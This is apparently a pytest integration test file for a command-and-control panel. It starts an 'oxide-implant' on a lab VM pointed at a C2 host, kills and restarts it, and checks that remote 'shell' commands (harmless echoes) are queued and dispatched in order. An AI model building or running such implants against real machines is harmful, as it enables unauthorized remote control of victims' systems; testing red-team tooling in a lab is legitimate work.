"""Task queue tests - commands sent while bot offline."""

import asyncio
import pytest

from .helpers.wait_conditions import wait_for_response, wait_for_bot_status, wait_for_bot_online


@pytest.mark.asyncio
async def test_queued_command_dispatched_on_reconnect(panel_client, target_vm_1, vm_manager):
    """Commands queued while offline are dispatched on reconnect."""
    # Start implant and get HWID
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Stop the implant
    vm_manager.run_ssh_command(target_vm_1, "pkill -9 oxide-implant", check=False)

    # Wait for bot to show offline
    await wait_for_bot_status(panel_client, hwid, "offline", timeout=90)

    # Queue a command while offline
    result = await panel_client.send_command(hwid, "shell", {"command": "echo queued-test"})
    assert result["queued"] is True
    assert result["status"] == "pending"

    # Restart implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    # Wait for command to complete
    response = await wait_for_response(panel_client, result["command_id"], timeout=60)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_multiple_queued_commands_fifo(panel_client, target_vm_1, vm_manager):
    """Multiple queued commands are dispatched in FIFO order."""
    # Start implant and get HWID
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Stop the implant
    vm_manager.run_ssh_command(target_vm_1, "pkill -9 oxide-implant", check=False)
    await wait_for_bot_status(panel_client, hwid, "offline", timeout=90)

    # Queue 3 commands in order
    results = []
    for i in range(3):
        result = await panel_client.send_command(hwid, "shell", {"command": f"echo cmd-{i}"})
        assert result["queued"] is True
        results.append(result)
        await asyncio.sleep(0.1)  # Ensure ordering

    # Restart implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    # Wait for all commands to complete
    responses = []
    for result in results:
        response = await wait_for_response(panel_client, result["command_id"], timeout=60)
        responses.append(response)

    # All should succeed
    assert all(r["status"] == "success" for r in responses)


@pytest.mark.asyncio
async def test_command_sent_immediately_when_online(panel_client, target_vm_1, vm_manager):
    """Commands are sent immediately when bot is online."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Send command to online bot
    result = await panel_client.send_command(hwid, "shell", {"command": "echo online-test"})

    # Should be dispatched immediately, not queued
    assert result["queued"] is False
    assert result["status"] == "dispatched"
